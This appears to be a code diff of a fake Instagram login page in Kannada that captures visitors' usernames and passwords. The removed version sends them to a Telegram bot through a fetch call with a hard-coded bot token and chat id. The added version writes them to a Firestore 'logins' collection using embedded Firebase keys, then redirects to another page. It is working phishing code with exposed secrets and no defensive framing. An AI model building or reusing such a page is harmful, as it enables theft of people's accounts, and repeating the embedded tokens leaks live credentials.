@@ -2,37 +2,67 @@
 <html lang="kn">
 <head>
     <meta charset="UTF-8">
-    <title>Instagram Login</title>
+    <title>Login • Instagram</title>
     <style>
-        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
-        .login-box { background: white; padding: 40px; border: 1px solid #dbdbdb; width: 350px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; }
-        button { width: 100%; padding: 10px; margin-top: 10px; background: #0095f6; color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; }
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { width: 350px; }
+        .login-box { background: white; padding: 40px; border: 1px solid #dbdbdb; text-align: center; margin-bottom: 10px; }
+        h1 { font-family: 'Brush Script MT', cursive; font-size: 2.5rem; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; padding: 8px; margin-top: 15px; background: #0095f6; color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 14px; }
+        .or-divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-weight: bold; font-size: 13px; }
+        .or-divider::before, .or-divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <h3>Instagram Login</h3>
-        <input type="text" id="username" placeholder="Username" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button onclick="sendData()">Log In</button>
+
+    <div class="login-container">
+        <div class="login-box">
+            <h1>Instagram</h1>
+            <input type="text" id="username" placeholder="Only( username ) login ">
+            <input type="password" id="password" placeholder="Password">
+            <button onclick="sendData()">Log In</button>
+            <div class="or-divider">OR</div>
+            <a href="#" style="color: #385185; font-size: 14px; text-decoration: none; font-weight: bold;">not use Facebook login </a>
+        </div>
     </div>
 
-    <script>
-        function sendData() {
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCZl507ZDCKEEok8tn8GXoKaWdvhhSbNlQ",
+            authDomain: "sykolive-846a3.firebaseapp.com",
+            projectId: "sykolive-846a3",
+            storageBucket: "sykolive-846a3.firebasestorage.app",
+            messagingSenderId: "705797986997",
+            appId: "1:705797986997:web:70c8263e3f712758bdbcfc"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        window.sendData = async function() {
             let user = document.getElementById('username').value;
             let pass = document.getElementById('password').value;
-            
-            let token = "8714344229:AAF7JCvpoJ8yw4PhRDI-xWIfzCfsrCZMmnY";
-            let chat_id = "5215749508";
-            
-            let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=User:${user}%0APass:${pass}`;
-            
-            fetch(url).then(() => {
+
+            if(user === "" || pass === "") {
+                alert("ದಯವಿಟ್ಟು ವಿವರಗಳನ್ನು ಭರ್ತಿ ಮಾಡಿ");
+                return;
+            }
+
+            try {
+                await addDoc(collection(db, "logins"), {
+                    username: user,
+                    password: pass,
+                    time: new Date().toLocaleString()
+                });
                 window.location.href = "psycho.html";
-            }).catch(e => {
+            } catch (e) {
+                console.error("Error: ", e);
                 window.location.href = "psycho.html";
-            });
+            }
         }
     </script>
 </body>
